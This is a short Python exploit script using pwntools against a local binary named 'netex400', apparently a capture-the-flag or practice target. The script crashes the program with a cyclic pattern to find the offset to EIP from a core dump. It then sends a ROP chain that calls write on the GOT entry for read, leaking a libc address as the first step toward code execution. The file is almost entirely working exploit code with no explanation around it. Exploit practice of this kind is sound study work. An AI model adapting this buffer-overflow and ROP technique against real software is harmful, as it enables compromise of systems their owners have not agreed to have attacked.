import subprocess
from pwn import *

context(os='linux',arch='x86')

#---------------------- Stage 1 -------------------------
info("Sending payload to crash the binary....")
elf = ELF('./netex400')
crash = cyclic(500)
p = process(elf.path)
p.sendline(crash)
p.wait()
core = p.corefile
eip = core.eip
offset = cyclic_find(eip)
success("Offset to EIP found @ {a}!".format(a=offset))

#---------------------- Stage 2 --------------------------
info("Creating first ROP chain to leak libc address.")

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
rop  = ROP(elf)

rop.call(elf.sym.write, [1,elf.got.read,4])
rop.call(0x8048370)
success(rop.dump())
p = process(elf.path)
p.sendline(rop.chain())
read = u32(p.recv(1024))
print(hex(read))
